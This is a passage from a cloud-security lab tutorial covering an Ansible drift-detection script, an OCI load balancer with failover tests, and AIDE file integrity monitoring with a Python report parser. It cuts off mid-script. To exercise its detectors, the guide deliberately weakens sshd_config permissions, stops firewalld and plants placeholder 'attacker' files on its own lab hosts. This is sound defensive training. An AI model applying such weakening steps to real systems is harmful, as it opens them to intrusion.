
```bash
cat > ~/oci-federal-lab-phase2/ansible/scripts/detect-drift.sh << 'SCRIPTEOF'
#!/bin/bash
# detect-drift.sh — Run Ansible in check mode and report any configuration drift
# Usage: ./detect-drift.sh [optional: path-to-playbook]

PLAYBOOK_PATH="${1:-hardening.yml}"
INVENTORY_PATH="inventory/hosts.ini"
REPORT_DIR="drift-reports"
TIMESTAMP=$(date +"%Y-%m-%dT%H-%M-%S")
REPORT_FILE="${REPORT_DIR}/drift-report-${TIMESTAMP}.txt"

mkdir -p "${REPORT_DIR}"

echo "========================================" | tee "${REPORT_FILE}"
echo "DRIFT DETECTION REPORT" | tee -a "${REPORT_FILE}"
echo "Timestamp: ${TIMESTAMP}" | tee -a "${REPORT_FILE}"
echo "Playbook:  ${PLAYBOOK_PATH}" | tee -a "${REPORT_FILE}"
echo "========================================" | tee -a "${REPORT_FILE}"

# Run ansible-playbook in check + diff mode and capture output
ansible-playbook "${PLAYBOOK_PATH}" \
  -i "${INVENTORY_PATH}" \
  --check \
  --diff \
  2>&1 | tee -a "${REPORT_FILE}"

EXIT_CODE=${PIPESTATUS[0]}

echo "" | tee -a "${REPORT_FILE}"
echo "========================================" | tee -a "${REPORT_FILE}"

if grep -q "changed=" "${REPORT_FILE}"; then
    CHANGED_COUNT=$(grep "changed=" "${REPORT_FILE}" | grep -oP 'changed=\K[0-9]+' | paste -sd+ | bc)
    echo "DRIFT DETECTED: ${CHANGED_COUNT} change(s) found" | tee -a "${REPORT_FILE}"
    echo "Review the diff sections above to identify what drifted." | tee -a "${REPORT_FILE}"
    echo "Report saved: ${REPORT_FILE}"
    exit 1
else
    echo "NO DRIFT DETECTED: All nodes match the hardening baseline." | tee -a "${REPORT_FILE}"
    echo "Report saved: ${REPORT_FILE}"
    exit 0
fi
SCRIPTEOF

chmod +x ~/oci-federal-lab-phase2/ansible/scripts/detect-drift.sh
```

**Run the script:**

```bash
cd ~/oci-federal-lab-phase2/ansible
./scripts/detect-drift.sh
```

If the cluster was just freshly configured by Ansible, you should see all `ok` tasks and the script exits with `NO DRIFT DETECTED`.

---

### Step 23A.3 — Simulate Drift and Detect It

📍 **k3s-server-node (SSH)** to inject the fault, then 📍 **Local Terminal (WSL2)** to detect it

**Simulate drift — manually change a configuration that your hardening playbook manages:**

```bash
ssh k3s-server-node

# Fault 1: change the permissions on sshd_config (hardening sets this to 600)
sudo chmod 644 /etc/ssh/sshd_config
ls -la /etc/ssh/sshd_config
# Expected: -rw-r--r-- 1 root root (was -rw-------)

# Fault 2: disable firewalld (hardening ensures it is enabled and running)
sudo systemctl stop firewalld
sudo systemctl status firewalld | grep "Active:"
# Expected: Active: inactive (dead)

exit
```

**Run drift detection from your local terminal:**

```bash
cd ~/oci-federal-lab-phase2/ansible
./scripts/detect-drift.sh
```

**Expected output (abbreviated):**

```
========================================
DRIFT DETECTION REPORT
Timestamp: 2026-04-08T14-45-00
Playbook:  hardening.yml
========================================

TASK [Ensure sshd_config has correct permissions] *****
changed: [k3s-server-node]
--- before: /etc/ssh/sshd_config
+++ after
@@ -1 +1 @@
-mode: '0644'
+mode: '0600'

TASK [Ensure firewalld is enabled and running] *****
changed: [k3s-server-node]
--- before
+++ after
@@ -1 +1 @@
-state: stopped
+state: started

PLAY RECAP *******************************
k3s-server-node : ok=8  changed=2  unreachable=0  failed=0

========================================
DRIFT DETECTED: 2 change(s) found
Review the diff sections above to identify what drifted.
Report saved: drift-reports/drift-report-2026-04-08T14-45-00.txt
```

The script exits with code 1 (non-zero), which means Jenkins will mark the pipeline step as failed — exactly what you want for automated alerting.

**Remediate the drift** by running the playbook for real (without `--check`):

```bash
ansible-playbook hardening.yml -i inventory/hosts.ini -v
# This actually applies the changes — restores permissions and restarts firewalld
```

**Run drift detection again to confirm clean:**

```bash
./scripts/detect-drift.sh
# Expected: NO DRIFT DETECTED: All nodes match the hardening baseline.
# Script exits 0
```

> **💼 Interview Insight — Drift Detection in Federal Environments:** "In federal cloud environments, configuration drift is a compliance finding, not just a technical problem. If an auditor runs a scan and finds a server diverged from its baseline, that's a Plan of Action and Milestones (POA&M) item — it requires documented remediation with a timeline. My drift detection pipeline catches it before the auditor does. The drift report becomes evidence for continuous monitoring under FedRAMP. I can say 'we run automated baseline checks daily and alert on any deviation' — that directly satisfies NIST 800-53 CM-6 and CM-7 controls."

> **💼 Interview Insight — Check Mode vs Actually Running:** "One subtlety of `--check` mode: it reports what Ansible *would* do, but some tasks can't be fully simulated. For example, if a task's output is used by a later task, check mode might report the later task as 'skipped' because it couldn't compute the dependency. In practice this means check mode catches 95% of drift, but a full remediation run occasionally finds more. I always follow a drift-detected alert with a remediation run and a second clean drift check to confirm."

---

### Phase 23 / 23A Troubleshooting

| Symptom | Likely cause | Fix |
|---------|-------------|-----|
| `ansible-playbook --check` fails with `unreachable` | ProxyCommand wrong in inventory or bastion SSH key not loaded | Test `ssh k3s-server-node` manually. Verify `ansible_ssh_common_args` has correct bastion IP. Run `ssh-add ~/.ssh/oci_key` |
| Drift report shows 0 tasks (empty playbook run) | Inventory hosts not matching playbook `hosts:` directive | Check `hardening.yml` top-level `hosts:` value matches group name in `hosts.ini`. Should be `k3s_cluster` or `all_managed_nodes` |
| `detect-drift.sh` always exits 0 even when drift exists | `grep "changed="` not finding the string in output | Check Ansible output format. Try `--check -v` manually and look for the word "changed" in the PLAY RECAP line. Adjust grep pattern if needed |
| Drift is detected but remediation playbook also fails | Task requires elevated privilege | Ensure `become: true` is set on tasks that modify system files. Add `--become` flag to playbook run |
| Simulated drift doesn't show up in check mode | Ansible task checks idempotency differently | Some tasks use `stat` + `when` conditionals — run with `-vvv` to see task logic. The `file` module uses mode comparison; confirm the exact octal mode in the playbook matches the fault you injected |
| k3s node NotReady after stopping k3s-agent for Exercise 3 | Expected — kubelet heartbeat stops | Fix is `sudo systemctl start k3s-agent`. Node returns Ready within ~30s |
| Pods not spreading across nodes | Kubernetes scheduling heuristics | Default scheduler avoids overloaded nodes but doesn't guarantee even spread. Add `topologySpreadConstraints` to force 1-per-node. For lab: `kubectl delete pod <one-pod>` to trigger reschedule |

---

## PHASE 23B: OCI LOAD BALANCER — 3-TIER ARCHITECTURE (1 hr)

> **🧠 ELI5 — Why a Load Balancer?** Right now, you access FedAnalytics through a k3s NodePort — `http://node-ip:30080`. That works in a lab, but in production it's three problems: (1) NodePort IPs change if you rebuild the node, (2) if one node dies you have to manually switch to the other, (3) there's no HTTPS termination. A load balancer solves all three: it has a stable public IP, automatically routes traffic to healthy nodes, and terminates HTTPS.
>
> This completes the **3-tier architecture** that every hiring manager expects:
>
> ```
> Tier 1 (Presentation):  OCI Load Balancer (public subnet, HTTPS)
>                              │
> Tier 2 (Application):   k3s pods on 2 nodes (private subnet)
>                              │
> Tier 3 (Data):          Oracle Autonomous DB (OCI-managed)
> ```
>
> **In Phase 2, you set this up manually via the OCI Console.** In Phase 3, you'll manage the same architecture as Terraform code (Appendix E).

> **Cost:** OCI provides 1 Always Free flexible load balancer (10 Mbps bandwidth). No additional cost for this lab.

> 📍 **Where work happens:** OCI Console for LB creation, Local Terminal for testing.
>
> 🛠️ **Build approach:** Console first (understand the concepts), then verify with curl.

---

### Step 23B.1 — Create the Load Balancer
📍 **OCI Console**

1. Navigate to **Networking** → **Load Balancers**
2. Click **Create Load Balancer**

**Page 1 — Load Balancer Details:**

| Field | Value | Why |
|-------|-------|-----|
| Load Balancer Type | **Load Balancer** (not Network Load Balancer) | Layer 7 — understands HTTP, can check `/health` |
| Name | `fedanalytics-lb` | Descriptive, matches the app |
| Visibility | **Public** | Needs to be reachable from the internet |
| Bandwidth | Flexible: **10 Mbps** min / **10 Mbps** max | Always Free tier limit |
| VCN | Select your Phase 2 VCN | Must be the same VCN as your k3s nodes |
| Subnet | Select your **public subnet** | LB gets a public IP from this subnet |

3. Click **Next**

**Page 2 — Backend Set:**

| Field | Value | Why |
|-------|-------|-----|
| Name | `k3s-backend-set` | One backend set for all k3s nodes |
| Policy | **Round Robin** | Distributes requests evenly across nodes |

**Health Check:**

| Field | Value | Why |
|-------|-------|-----|
| Protocol | HTTP | Check the app's `/health` endpoint, not just TCP connectivity |
| Port | `30080` | The NodePort where FedAnalytics is exposed on k3s |
| URL Path | `/health` | Your app returns `{"status": "healthy"}` on this path |
| Interval | `10000` ms | Check every 10 seconds |
| Timeout | `3000` ms | Fail if the check takes longer than 3 seconds |
| Retries | `3` | Mark unhealthy after 3 consecutive failures (30 seconds) |

> **🧠 ELI5 — Health Checks:** The load balancer doesn't just blindly send traffic. Every 10 seconds, it hits `/health` on each backend. If a node returns a non-200 response 3 times in a row, the LB stops sending traffic to it. When the node recovers, the LB automatically adds it back. This is why you built the `/health` endpoint in every FastAPI app — it's not just for debugging, it's infrastructure.

4. Click **Add Backends** — add both k3s nodes:

| Backend | IP Address | Port | Weight |
|---------|-----------|------|--------|
| k3s node-1 | `<NODE_1_PRIVATE_IP>` | `30080` | 1 |
| k3s node-2 | `<NODE_2_PRIVATE_IP>` | `30080` | 1 |

> Get the private IPs from Terraform output: `terraform output` or from the OCI Console (Compute → Instances).

5. Click **Next**

**Page 3 — Listener:**

| Field | Value | Why |
|-------|-------|-----|
| Name | `http-listener` | In production, use `https-listener` with a certificate |
| Protocol | HTTP | For lab; production would use HTTPS with OCI Certificate |
| Port | `80` | Standard HTTP port. LB accepts on 80, forwards to backends on 30080 |

6. Click **Create Load Balancer** — provisioning takes 2-3 minutes

---

### Step 23B.2 — Update Security Lists
📍 **OCI Console**

The LB needs two Security List rules:

**Public subnet Security List** (if not already present):
- Ingress: Source `0.0.0.0/0`, Protocol TCP, Destination Port `80` — allows internet traffic to reach the LB

**Private subnet Security List:**
- Ingress: Source `<PUBLIC_SUBNET_CIDR>` (e.g., `10.0.0.0/24`), Protocol TCP, Destination Port `30080` — allows the LB (in public subnet) to reach the k3s NodePort

> **Why the LB's traffic comes from the public subnet:** The load balancer lives in the public subnet. When it forwards a request to your k3s node, the source IP is the LB's private IP in the public subnet. The private subnet's Security List must allow that traffic. Without this rule, health checks fail and the LB marks all backends as unhealthy.

---

### Step 23B.3 — Test the 3-Tier Architecture
📍 **Local Terminal (WSL2)**

```bash
# Get the LB's public IP from the OCI Console
# Load Balancers → fedanalytics-lb → IP Addresses section
LB_IP="<YOUR_LB_PUBLIC_IP>"

# Test through the load balancer
curl -s "http://${LB_IP}/health" | python3 -m json.tool
# Expected: {"status": "healthy", "service": "fedanalytics", ...}

# Test data ingestion through LB
curl -s -X POST "http://${LB_IP}/ingest" \
  -H "Content-Type: application/json" \
  -d '{"source": "lb-test", "data_type": "test", "payload": {"message": "through load balancer"}}' | python3 -m json.tool

# Test metrics through LB
curl -s "http://${LB_IP}/metrics" | python3 -m json.tool
```

**Verify load distribution:**

```bash
# Send 20 requests and check which node handles each
for i in $(seq 1 20); do
  RESP=$(curl -s "http://${LB_IP}/health")
  echo "Request ${i}: ${RESP}" | python3 -c "import sys,json; d=json.load(sys.stdin.buffer); print(f'Request {sys.argv[1]}: node={d.get(\"hostname\",\"unknown\")}')" "${i}" 2>/dev/null || echo "Request ${i}: response received"
done
# Expected: Requests distributed across both nodes (round-robin)
```

> **What you just proved:** Traffic enters via the LB's public IP, gets distributed across both k3s nodes, reaches the FedAnalytics pods, queries the Autonomous DB, and returns through the same path. All three tiers are working. If you stop one node (`sudo systemctl stop k3s-agent`), the LB detects the failure within 30 seconds and routes all traffic to the surviving node.

---

### Step 23B.4 — Test Failover
📍 **Bastion Terminal** + **Local Terminal**

```bash
# From bastion: stop k3s on node-2 to simulate a failure
ssh node-2 'sudo systemctl stop k3s-agent'
```

```bash
# From local terminal: watch the LB handle it
# Wait 30 seconds for health check to detect the failure, then:
for i in $(seq 1 10); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://${LB_IP}/health")
  echo "Request ${i}: HTTP ${CODE}"
done
# Expected: All requests return 200 — the LB routes everything to node-1
```

```bash
# Restore node-2
ssh node-2 'sudo systemctl start k3s-agent'
# Wait 30 seconds for health check to detect recovery
# Traffic resumes to both nodes
```

<sub><em>

| Action | What Happens | Timing |
|--------|-------------|--------|
| Stop k3s on node-2 | LB health checks start failing for node-2 | Immediate |
| 30 seconds later | LB marks node-2 unhealthy after 3 failed checks (10s interval × 3 retries) | 30 seconds |
| All traffic → node-1 | Users see zero downtime — LB handles the failover transparently | Automatic |
| Restart k3s on node-2 | LB health checks start passing again | ~10 seconds |
| Traffic resumes to both | LB adds node-2 back to rotation | Automatic |

</em></sub>

> **💼 Interview Insight — Load Balancer Failover:** "I tested failover by stopping one k3s node. The load balancer detected the failure within 30 seconds via HTTP health checks on the `/health` endpoint, and automatically stopped routing traffic to the failed node. When I restarted the node, the LB added it back within 10 seconds. Users experienced zero downtime. This is the same pattern used in production federal systems — the health check endpoint isn't optional, it's infrastructure."

> **💼 Interview Insight — 3-Tier Architecture:** "My lab uses a standard 3-tier architecture: OCI Load Balancer in the public subnet distributes traffic across k3s application nodes in the private subnet, which query Oracle Autonomous DB in the data tier. The LB handles health checking and failover automatically. In Phase 3, I manage this same architecture as Terraform code — the LB, backend set, health check, and listener are all `oci_load_balancer_*` resources."

---

### Phase 23B Troubleshooting

| Check | Expected | If It Fails |
|-------|----------|-------------|
| LB shows "Active" in Console | Green status badge | Provisioning takes 2-3 min. Check subnet has internet gateway route |
| Health check shows backends "OK" | Both backends healthy (green) | Security List missing? Check private subnet allows TCP 30080 from public subnet CIDR. App not running? Check `kubectl get pods` |
| `curl LB_IP/health` returns JSON | `{"status": "healthy"}` | LB listener port wrong? Check it's 80. Backend port wrong? Check it's 30080 |
| Failover works (stop one node) | Traffic continues via other node | Health check interval too long? Reduce to 5000ms for faster detection |
| Both backends show "OK" after restart | Both green | k3s-agent service not started? Check `systemctl status k3s-agent` on the restarted node |

---

### Phase 23B Complete ✅

**What you built:**
- OCI Load Balancer with public IP in the public subnet
- Round-robin distribution across 2 k3s nodes
- HTTP health checks on `/health` endpoint (10-second interval, 3 retries)
- Automatic failover tested and verified (zero downtime)
- Complete 3-tier architecture: LB → k3s pods → Autonomous DB

**Full network path:**
```
Internet → LB (public:80) → k3s node-1/node-2 (private:30080) → FedAnalytics pod → ADB
```

---

## PHASE 2 — DAYS 1-3 COMPLETE

**Phase 2 Days 1-3 covered Phases 20-23B:** Infrastructure deployment with Terraform + Ansible, FedAnalytics FastAPI application with webhook integration, OCI API Gateway with rate limiting, Jenkins to CloudBees CI migration, k3s 2-node Kubernetes cluster, OCI Load Balancer with 3-tier architecture, and Ansible drift detection.

**Skills practiced so far:** Terraform (OCI provider, multi-instance), Ansible (hardening + deployment + drift detection), FastAPI (webhooks/HMAC), OCI Autonomous Database, systemd, Jenkins/CloudBees CI, k3s Kubernetes, OCI Load Balancer, OCI API Gateway, configuration drift monitoring.

**Total Phase 2 artifacts so far:** Terraform configs, Ansible playbooks + drift detection script, FedAnalytics FastAPI app, k3s manifests, Jenkins CasC YAML, CloudBees comparison doc, load balancer config.

---

## PHASE 24: AIDE FILE INTEGRITY MONITORING (1.5 hrs)

📍 **Where work happens:** SSH to `k3s-server` through bastion. All AIDE commands run as `sudo` on the k3s-server node.

<sub><em>

| Sequence | Step | Duration |
|----------|------|----------|
| Morning | 24.1 — Why FIM? | 10 min |
| Morning | 24.2 — Install + Initialize AIDE | 25 min |
| Morning | 24.3 — Clean baseline check | 10 min |
| Morning | 24.4 — Simulate changes + detect | 30 min |
| Morning | 24.5 — Automate with cron | 25 min |

</em></sub>

---

### Step 24.1 — Why File Integrity Monitoring?

> **🧠 ELI5 — AIDE is a Fingerprint Scanner for Your Filesystem:** Imagine you take a photograph of your entire house — every room, every object in its exact position. AIDE does the same thing for your filesystem: it records a "fingerprint" (cryptographic hash) of every important file. Later, you take another photo and compare. If a file moved, changed, or appeared out of nowhere, AIDE spots the difference. In a federal environment, an attacker who gains access often modifies config files, installs backdoors, or replaces legitimate binaries. AIDE catches all of it.

**What AIDE monitors:**

AIDE (Advanced Intrusion Detection Environment) tracks file attributes across your filesystem and alerts you when anything changes outside of normal change-management processes. It is not a real-time tool — it runs on demand or on a schedule, compares the current state to a known-good baseline, and reports differences.

**The NIST 800-53 connection:**

AIDE directly satisfies **SI-7 (Software, Firmware, and Information Integrity)**, which requires federal systems to detect unauthorized changes to software and configuration data. FedRAMP Moderate baseline requires SI-7. If you're asked "how do you prove your system hasn't been tampered with?" — AIDE is the answer.

| NIST Control | What It Requires | How AIDE Satisfies It |
|---|---|---|
| SI-7 | Detect unauthorized changes to software/config | Cryptographic hashes on files, checked on schedule |
| SI-7(1) | Automated integrity checks | Cron job runs AIDE daily |
| SI-7(2) | Automated notifications of integrity violations | Cron outputs to syslog + email alert |
| AU-9 | Protect audit information from unauthorized modification | AIDE monitors audit log directories |

> **💼 Interview Insight — File Integrity Monitoring:** "AIDE is not glamorous, but it's required. I implemented it to satisfy NIST 800-53 SI-7. The key thing I explain in interviews: AIDE's value is in the baseline, not the tool itself. A baseline taken after an attacker already modified files is worthless. You have to establish the baseline immediately after a clean build — before the system ever accepts production traffic. In our lab, the baseline is taken right after Ansible hardening runs and before FedAnalytics is exposed to any traffic."

---

### Step 24.2 — Install and Initialize AIDE

#### Connect to k3s-server

```bash
# From your local machine (WSL2):
ssh -J fedanalytics-bastion fedanalytics-k3s-server
```

| Flag | What It Does |
|------|-------------|
| `-J fedanalytics-bastion` | ProxyJump — route through bastion host (defined in your SSH config) |
| `fedanalytics-k3s-server` | The alias for your k3s-server private IP (also in SSH config) |

#### Install AIDE

```bash
sudo dnf install -y aide
```

AIDE is in the Oracle Linux 9 default repos — no additional repo configuration needed. The install creates `/etc/aide.conf` automatically.

#### Review and configure `/etc/aide.conf`

The default config is large (300+ lines). For this lab, you will understand the key directives and then add a custom rule block for your FedAnalytics app files.

```bash
sudo nano /etc/aide.conf
```

The file has two sections: **macro definitions** (what attributes to check as groups) and **watch rules** (which paths to monitor using which attribute groups).

**Key macro definitions already in the file:**

```
# These are "check groups" — named sets of file attributes AIDE will verify
FIPSR = p+i+n+u+g+s+m+c+acl+selinux+xattrs+sha512
# p = permissions, i = inode, n = link count, u = owner, g = group
# s = file size, m = mtime, c = ctime, sha512 = file content hash

NORMAL = fipsr-sha512+sha512
# A common alias used in most watch rules

LOG = p+i+n+u+g+S
# S = size change only — used for log files (content changes constantly, size matters)
```

**Key watch rules already in the file:**

```
# Directories to monitor (AIDE will recurse into them)
/boot   FIPSR
/bin    FIPSR
/sbin   FIPSR
/lib    FIPSR
/etc    FIPSR

# Directories to EXCLUDE (too noisy or managed externally)
!/etc/mtab
!/var/log
!/var/run
!/proc
```

> **🧠 ELI5 — The `!` prefix:** An exclamation mark in front of a path tells AIDE "ignore this." Log files change constantly by design — if you monitored `/var/log` with AIDE, every run would show thousands of false positives. You exclude the things that are supposed to change so that alerts only fire on things that should NOT change.

**Add a custom rule block for your FedAnalytics app:**

```bash
sudo tee -a /etc/aide.conf << 'EOF'

# --- FedAnalytics Custom Rules ---
# Monitor the app directory — any unauthorized modification detected here
# is a high-severity incident (SI-7 violation)
/home/fedanalytics-user/fedanalytics-app   FIPSR

# Monitor k3s service configuration
/etc/systemd/system/fedanalytics.service   FIPSR

# Monitor k3s manifests directory
/var/lib/rancher/k3s/server/manifests      FIPSR

# Log-style monitoring for app logs (detect size anomalies without hash churn)
/home/fedanalytics-user/fedanalytics-app/logs   LOG
EOF
```

#### Initialize the AIDE baseline database

```bash
sudo aide --init
```

This command walks every path in `aide.conf`, computes the cryptographic hashes and attribute values for every file, and writes them to a temporary database file. This takes 3-7 minutes on the A1 Flex — the ARM processor is fast but there are thousands of files to hash.

Expected output (last few lines):

```
AIDE, version 0.16

### AIDE database at /var/lib/aide/aide.db.new.gz initialized.
```

**Promote the new database to the active baseline:**

```bash
sudo cp /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz
```

| File | Purpose |
|------|---------|
| `/var/lib/aide/aide.db.new.gz` | Written by `--init` — the newly-created database |
| `/var/lib/aide/aide.db.gz` | The active baseline AIDE reads during `--check` |

> **Why copy instead of rename?** AIDE always writes new databases to `.db.new.gz` so it never overwrites your active baseline accidentally. You explicitly promote the new database when you're satisfied it represents a known-good state. This is a deliberate design choice — you, as the administrator, decide when a baseline is trustworthy.

#### Backup the baseline to a secure location

```bash
# Back up the baseline immediately after creation
sudo cp /var/lib/aide/aide.db.gz /home/fedanalytics-user/aide-baseline-$(date +%Y%m%d).db.gz
ls -lh /home/fedanalytics-user/aide-baseline-*.db.gz
```

This pre-attack backup will be used in the Phase 25 DR drill to restore a clean baseline after the simulated ransomware attack.

---

### Step 24.3 — Run First Check (Clean Baseline)

```bash
sudo aide --check
```

Expected output on a clean system:

```
AIDE, version 0.16

### All files match AIDE database. Looks okay!

Number of entries:    45231
---------------------------------------------------
The attributes of the (uncompressed) database(s):
---------------------------------------------------

/var/lib/aide/aide.db.gz
  MD5      : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  SHA1     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

---------------------------------------------------
Start timestamp: 2026-04-08 09:14:22 -0400 (AIDE 0.16)
End timestamp:   2026-04-08 09:17:41 -0400
---------------------------------------------------
```

> **This output is your "all clear."** No changes detected means the system is in the exact state captured during `--init`. This is your reference point. Every future `--check` will compare against this state.

**What the summary numbers mean:**

| Field | Meaning |
|-------|---------|
| `Number of entries` | Total files/directories monitored |
| Start/End timestamp | How long the check took (3-5 min is normal) |
| `All files match` | Zero integrity violations detected |

> **💼 Interview Insight — What "clean baseline" means in practice:** "When you establish a baseline, you're making a formal declaration: 'This is the known-good state of this system.' In federal programs, that declaration is tied to a change management record. Any future `aide --check` that shows differences outside of approved changes is a security incident by definition — not 'something to look into later.' I built the habit of running AIDE after every Ansible playbook run to confirm the change matched exactly what was planned."

---

### Step 24.4 — Simulate Unauthorized Changes and Detect

This step simulates what an attacker or misconfigured process does to a system: adding unexpected files, modifying permissions on sensitive configs.

#### Make unauthorized changes

```bash
# Simulate an attacker dropping a file in /etc
sudo touch /etc/suspicious-attacker-file

# Simulate privilege escalation preparation — widening sshd_config permissions
sudo chmod 777 /etc/ssh/sshd_config

# Simulate a malicious binary appearing in /bin (touch creates an empty file)
sudo touch /bin/fake-malicious-binary
```

> **Why these specific changes?** These represent the three most common post-exploitation filesystem patterns: dropping payload files, widening permissions on sensitive config to enable further access, and planting fake executables. AIDE needs to catch all three.

#### Run AIDE check — detect the changes

```bash
sudo aide --check 2>&1 | tee /tmp/aide-check-results.txt
```

| Part | What It Does |
|------|-------------|
| `sudo aide --check` | Run the integrity check against baseline |
| `2>&1` | Merge stderr into stdout (AIDE sends some output to stderr) |
| `tee /tmp/aide-check-results.txt` | Write output to screen AND save to file for parsing |

Expected output — AIDE will flag all three changes:

```
AIDE, version 0.16

### AIDE found differences between database and filesystem!!
Start timestamp: 2026-04-08 09:22:07 -0400 (AIDE 0.16)

Summary:
  Total number of entries:        45231
  Added entries:                  2
  Removed entries:                0
  Changed entries:                1

---------------------------------------------------
Added entries:
---------------------------------------------------

f++++++++++++++++: /bin/fake-malicious-binary
f++++++++++++++++: /etc/suspicious-attacker-file

---------------------------------------------------
Changed entries:
---------------------------------------------------

f   ...    Lp.. . . : /etc/ssh/sshd_config

---------------------------------------------------
Detailed information about changes:
---------------------------------------------------

File: /etc/ssh/sshd_config
  Permissions  : -rw-r--r--              | -rwxrwxrwx
  Mtime        : 2026-04-07 18:00:00     | 2026-04-08 09:21:53

---------------------------------------------------
```

**Reading the AIDE output format:**

| Symbol | Meaning |
|--------|---------|
| `f++++++++++++++++:` | File was **added** (not in baseline) |
| `f   ...    Lp.. . . :` | File **changed** — each dot/letter position maps to an attribute |
| `p` position changed | Permissions changed |
| `L` position changed | Symlink target changed |
| `m` position changed | Mtime changed |

The attribute position string maps to: `p i n u g s b m c S sha512 acl selinux xattrs`

> **🧠 ELI5 — Reading the change string:** The long string of dots and letters after `f` is like a checklist with 16 checkboxes. A dot means "this attribute is unchanged." A letter means "this attribute changed." `Lp.. . . ` means permissions (p) changed. Everything else is the same.

#### Create `aide_parser.py` — parse AIDE output into structured JSON

This script transforms raw AIDE text output into JSON that could feed a SIEM, ticketing system, or incident dashboard.

```bash
cat > ~/oci-federal-lab-phase2/scripts/aide_parser.py << 'EOF'
#!/usr/bin/env python3
"""
aide_parser.py — Parse AIDE integrity check output into structured JSON.

Usage:
    sudo aide --check 2>&1 | python3 aide_parser.py
    python3 aide_parser.py --input /tmp/aide-check-results.txt
    python3 aide_parser.py --input /tmp/aide-check-results.txt --output /tmp/aide-report.json

Output: JSON incident report with categorized changes and severity assessment.
"""

import sys
import json
import re
import argparse
from datetime import datetime, timezone


# Paths considered high-severity if changed
HIGH_SEVERITY_PATHS = [
    "/etc/ssh/",
    "/etc/sudoers",
    "/etc/pam.d/",
    "/bin/",
    "/sbin/",
    "/usr/bin/",
    "/usr/sbin/",
    "/boot/",
    "/lib/",
    "/home/fedanalytics-user/fedanalytics-app/",
]

# Paths considered medium-severity if changed
MEDIUM_SEVERITY_PATHS = [
    "/etc/",
    "/var/lib/rancher/",
    "/etc/systemd/",
]


def classify_severity(file_path):
    """Return HIGH, MEDIUM, or LOW based on which directory the file lives in."""
    for high_path in HIGH_SEVERITY_PATHS:
        if file_path.startswith(high_path):
            return "HIGH"
    for medium_path in MEDIUM_SEVERITY_PATHS:
        if file_path.startswith(medium_path):
            return "MEDIUM"
    return "LOW"


def parse_aide_output(raw_text):
    """
    Parse raw AIDE --check output into a structured dictionary.

    Returns a dict with:
        - summary: counts of added/removed/changed files
        - added: list of added file paths
        - removed: list of removed file paths
        - changed: list of changed file paths with attribute details
        - severity_breakdown: count by HIGH/MEDIUM/LOW
        - highest_severity: the worst severity found
        - timestamp_check: when AIDE ran
        - clean: True if no changes detected
    """
    result = {
        "report_generated_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "clean": True,
        "summary": {"added": 0, "removed": 0, "changed": 0},
        "added": [],
        "removed": [],
        "changed": [],
        "severity_breakdown": {"HIGH": 0, "MEDIUM": 0, "LOW": 0},
        "highest_severity": "NONE",
        "timestamp_check": None,
        "raw_summary_line": None,
    }

    # Check for clean state
    if "All files match AIDE database" in raw_text:
        return result

    result["clean"] = False

    # Extract timestamp
    timestamp_match = re.search(r"Start timestamp:\s+(.+?)\s+\(AIDE", raw_text)
    if timestamp_match:
        result["timestamp_check"] = timestamp_match.group(1).strip()

    # Extract summary counts
    added_match = re.search(r"Added entries:\s+(\d+)", raw_text)
    removed_match = re.search(r"Removed entries:\s+(\d+)", raw_text)
    changed_match = re.search(r"Changed entries:\s+(\d+)", raw_text)

    if added_match:
        result["summary"]["added"] = int(added_match.group(1))
    if removed_match:
        result["summary"]["removed"] = int(removed_match.group(1))
    if changed_match:
        result["summary"]["changed"] = int(changed_match.group(1))

    # Extract added file paths — lines starting with f++++ or d++++
    added_section = re.search(
        r"Added entries:\s*-+\s*(.*?)\s*(?:Removed entries:|Changed entries:|Detailed information)",
        raw_text,
        re.DOTALL,
    )
    if added_section:
        for line in added_section.group(1).strip().splitlines():
            path_match = re.search(r"[fd][+]+:\s+(.+)", line)
            if path_match:
                file_path = path_match.group(1).strip()
                severity = classify_severity(file_path)
                result["added"].append({"path": file_path, "severity": severity})
                result["severity_breakdown"][severity] += 1

    # Extract removed file paths
    removed_section = re.search(
        r"Removed entries:\s*-+\s*(.*?)\s*(?:Added entries:|Changed entries:|Detailed information)",
        raw_text,
        re.DOTALL,
    )
    if removed_section:
        for line in removed_section.group(1).strip().splitlines():
            path_match = re.search(r"[fd]-+:\s+(.+)", line)
            if path_match:
                file_path = path_match.group(1).strip()
                severity = classify_severity(file_path)
                result["removed"].append({"path": file_path, "severity": severity})
                result["severity_breakdown"][severity] += 1

    # Extract changed file paths with attribute strings
    changed_section = re.search(
        r"Changed entries:\s*-+\s*(.*?)\s*(?:Detailed information|$)",
        raw_text,
        re.DOTALL,
    )
    if changed_section:
        for line in changed_section.group(1).strip().splitlines():
            path_match = re.search(r"[fd]\s+([\w.]+)\s+:\s+(.+)", line)
            if path_match:
                file_path = path_match.group(2).strip()
                attribute_string = path_match.group(1).strip()
                severity = classify_severity(file_path)
                result["changed"].append(
                    {
                        "path": file_path,
                        "changed_attributes": attribute_string,
                        "severity": severity,
                    }
                )
                result["severity_breakdown"][severity] += 1

    # Determine highest severity across all findings
    if result["severity_breakdown"]["HIGH"] > 0:
        result["highest_severity"] = "HIGH"
    elif result["severity_breakdown"]["MEDIUM"] > 0:
        result["highest_severity"] = "MEDIUM"
    elif result["severity_breakdown"]["LOW"] > 0:
        result["highest_severity"] = "LOW"

    return result


def main():
    parser = argparse.ArgumentParser(
        description="Parse AIDE --check output into structured JSON incident report."
    )
    parser.add_argument(
        "--input",
        help="Path to AIDE output file. If omitted, reads from stdin.",
        default=None,
    )
    parser.add_argument(
        "--output",
        help="Path to write JSON report. If omitted, writes to stdout.",
        default=None,
    )
    args = parser.parse_args()

    # Read input from file or stdin
    if args.input:
        with open(args.input, "r") as input_file:
            raw_aide_text = input_file.read()
    else:
        raw_aide_text = sys.stdin.read()

    # Parse the AIDE output
    parsed_report = parse_aide_output(raw_aide_text)

    # Build a human-readable summary alongside the structured data
    total_findings = (
        parsed_report["summary"]["added"]
        + parsed_report["summary"]["removed"]
        + parsed_report["summary"]["changed"]
    )

    parsed_report["incident_summary"] = {
        "total_findings": total_findings,
        "requires_immediate_action": parsed_report["highest_severity"] == "HIGH",
        "description": (
            "No integrity violations detected. System matches baseline."
            if parsed_report["clean"]
            else (
                f"INTEGRITY VIOLATION DETECTED. {total_findings} unauthorized change(s) found. "
